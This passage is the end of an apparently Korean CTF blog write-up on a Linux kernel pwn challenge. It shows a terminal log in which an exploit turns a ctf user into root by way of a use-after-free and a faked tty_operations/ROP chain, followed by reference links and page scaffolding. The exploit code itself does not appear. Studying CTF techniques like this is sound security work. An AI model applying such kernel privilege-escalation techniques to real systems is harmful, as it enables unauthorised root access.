<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Boot took 0.93 seconds</span><br><span class="line"></span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">/ $ ./exploit</span><br><span class="line">[   10.168566] device open</span><br><span class="line">[   10.170749] device open</span><br><span class="line">[   10.171988] alloc done</span><br><span class="line">[   10.173196] device release</span><br><span class="line">&amp;rop : 0x7ffdba0f7390</span><br><span class="line">&amp;tty_operations : 0x6bb340</span><br><span class="line">[   10.176799] tty driver ptm lacks a write_room method.</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>
<p><hr></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=29327365" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=29327365</a></p>
</li>
<li><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=25624658" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=25624658</a></p>
</li>
<li><p><a href="https://elixir.bootlin.com/linux/v4.4/source/include" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4/source/include</a></p>
</li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
      <blockquote class="mdui-m-t-5">
        
      </blockquote>
      
    </div>
    
  </article>
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>


  <nav id="paginator">
    
    <div class="spacer"></div>
    
      <a rel="next" class="extend next" href="/2019/10/18/Pwn/ㄴ WriteUps/2017_codegate_js_world/">
        이전 글&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
      </a>
    
  </nav>




</main>
  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
  <div class="mdui-p-y-0 mdui-text-center">
    
    
    
    
    
    
    
    
    
    
    
    
  </div>
  <div class="mdui-p-y-1 mdui-text-center">
    Copyright &copy; 2019 - 2019 Defenit<br>
    
  </div>
</footer>

  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
  
  <script src="/js/mdui.js"></script>
<script src="/js/script.js"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<!--<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML'></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>